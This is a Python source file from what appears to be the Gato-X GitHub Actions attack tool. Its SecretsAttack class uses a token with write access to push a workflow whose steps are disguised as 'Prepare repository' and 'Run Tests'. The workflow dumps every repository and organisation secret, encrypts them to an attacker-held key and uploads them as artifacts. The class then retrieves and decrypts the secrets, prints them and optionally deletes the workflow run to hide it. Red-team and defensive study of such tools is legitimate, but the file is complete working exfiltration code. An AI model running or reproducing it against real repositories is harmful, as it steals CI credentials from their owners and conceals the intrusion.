"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import asyncio
import hashlib
import json
import random
import string

import yaml
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from gatox.attack.attack import Attacker
from gatox.cli.output import Output


class SecretsAttack(Attacker):
    """This class contains methods to create malicious yaml files for accessing and
    exfiltrating GitHub Actions secrets files.
    """

    async def __collect_secret_names(self, target_repo):
        """Method to collect list of secrets prior to exfil.

        Args:
            target_repo (str): Repository to get secrets from.

        Returns:
            list: List of secret names accessible to the repository.
        """

        secrets = []
        secret_names = []
        repo_secret_list = await self.api.get_secrets(target_repo)
        org_secret_list = await self.api.get_repo_org_secrets(target_repo)

        if repo_secret_list:
            secrets.extend(repo_secret_list)

        if org_secret_list:
            secrets.extend(org_secret_list)

        if not secrets:
            Output.warn("The repository does not have any accessible secrets!")
            return False
        else:
            Output.owned(
                f"The repository has {Output.bright(len(secrets))} "
                "accessible secret(s)!"
            )

        secret_names = [secret["name"] for secret in secrets]

        return secret_names

    @staticmethod
    def create_environment_exfil_yaml(pubkey: str, branch_name: str, environment: str):
        raise NotImplementedError

    @staticmethod
    def create_exfil_yaml(pubkey: str, branch_name):
        """Create a malicious yaml file that will trigger on push and attempt
        to exfiltrate the provided list of secrets.

        Args:
            pubkey (str): Public key to encrypt the plaintext values with.
            branch_name (str): Name of the branch for on: push trigger.

        """
        yaml_file = {}

        yaml_file["name"] = branch_name
        yaml_file["on"] = {"push": {"branches": branch_name}}

        test_job = {
            "runs-on": ["ubuntu-latest"],
            "steps": [
                {
                    "env": {"VALUES": "${{ toJSON(secrets)}}"},
                    "name": "Prepare repository",
                    "run": """
cat <<EOF > output.json
$VALUES
EOF
                    """,
                },
                {
                    "name": "Run Tests",
                    "env": {"PUBKEY": pubkey},
                    "run": "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
                    "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
                    'echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;',
                },
                # Upload the encrypted files as workfow run artifacts.
                # This avoids the edge case where there is a secret set to a value that is in the Base64 (which breaks everything).
                {
                    "name": "Upload artifacts",
                    "uses": "actions/upload-artifact@v4",
                    "with": {
                        "name": "files",
                        "path": " |\noutput_updated.json\nlookup.txt",
                    },
                },
            ],
        }
        yaml_file["jobs"] = {"testing": test_job}

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def __create_private_key():
        """Creates a private and public key to safely exfil secrets."""
        private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=4096, backend=default_backend()
        )
        public_key = private_key.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )

        return (private_key, pem.decode())

    @staticmethod
    def __decrypt_secrets(priv_key, encrypted_key, encrypted_secrets):
        """Utility method to decrypt secrets given ciphertext blob and a private key."""
        salt = encrypted_secrets[8:16]
        ciphertext = encrypted_secrets[16:]

        sym_key = priv_key.decrypt(encrypted_key, padding.PKCS1v15()).decode()
        sym_key = sym_key.replace("\n", "")
        derived_key = hashlib.pbkdf2_hmac("sha256", sym_key.encode(), salt, 10000, 48)
        key = derived_key[0:32]
        iv = derived_key[32:48]

        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
        decryptor = cipher.decryptor()

        cleartext = decryptor.update(ciphertext) + decryptor.finalize()
        cleartext = cleartext[: -cleartext[-1]]

        return cleartext

    async def secrets_dump(
        self,
        target_repo: str,
        target_branch: str,
        commit_message: str,
        delete_action: bool,
        yaml_name: str,
        finegrain_scopes: set = None,
    ):
        """Given a user with write access to a repository, runs a workflow that
        dumps all repository secrets.

        Args:
            target_repo (str): Repository to target.
            target_branch (str): Branch to create workflow in.
            commit_message (str): Commit message for exfil workflow.
            delete_action (bool): Whether to delete the workflow after
            execution.
            yaml_name (str): Name of yaml to use for exfil workflow.

        """
        if finegrain_scopes is None:
            finegrain_scopes = []
        await self.setup_user_info()

        if not self.user_perms:
            return False
        if (
            "repo" in self.user_perms["scopes"]
            and "workflow" in self.user_perms["scopes"]
        ) or (
            "workflows:write" in finegrain_scopes
            and "contents:write" in finegrain_scopes
        ):
            # Only list secrets if we are not doing fine-grained PAT attack
            if not finegrain_scopes or "secrets:read" in finegrain_scopes:
                secret_names = await self.__collect_secret_names(target_repo)
                if not secret_names:
                    Output.warn("No accessible secrets to exfiltrate, not attempting!")
                    return False
            else:
                Output.info("Skipping secret enumeration for fine-grained PAT attack.")

            # Randomly generate a branch name, since this will run immediately
            if target_branch:
                branch = target_branch
            else:
                branch = "".join(random.choices(string.ascii_lowercase, k=10))

            res = await self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                Output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                Output.error(f"Remote branch, {branch}, already exists!")
                return
            priv_key, pubkey_pem = self.__create_private_key()
            yaml_contents = self.create_exfil_yaml(pubkey_pem, branch)
            workflow_id = await self.execute_and_wait_workflow(
                target_repo, branch, yaml_contents, commit_message, yaml_name
            )
            if not workflow_id:
                return

            # Retry artifact retrieval - artifacts may not be immediately
            # available after workflow completion
            res = None
            for _ in range(30):
                res = await self.api.retrieve_workflow_artifact(
                    target_repo, workflow_id
                )
                if res and "output_updated.json" in res and "lookup.txt" in res:
                    break
                await asyncio.sleep(1)

            if not res or not ("output_updated.json" in res and "lookup.txt" in res):
                Output.error(
                    "Failed to retrieve workflow artifact! "
                    "Artifacts may not have been uploaded."
                )
            else:
                # Carve files out of the zipfile.

                # lookup.txt is the encrypted AES key
                # output_updated.json is the AES encrypted json blob

                cleartext = self.__decrypt_secrets(
                    priv_key, res["lookup.txt"], res["output_updated.json"]
                )
                Output.owned("Decrypted and Decoded Secrets:")
                secrets = json.loads(cleartext)

                # Filter out github_token which is always present
                extracted = {k: v for k, v in secrets.items() if k != "github_token"}

                if not extracted:
                    Output.warn(
                        "No secrets were extracted. Org secrets are not "
                        "accessible to public repos on the free plan."
                    )
                else:
                    for k, v in extracted.items():
                        print(f"{k}={v}")
            if delete_action and (
                not finegrain_scopes or "actions:write" in finegrain_scopes
            ):
                res = await self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    Output.error("Failed to delete workflow!")
                else:
                    Output.result("Workflow deleted sucesfully!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this attack!"
            )
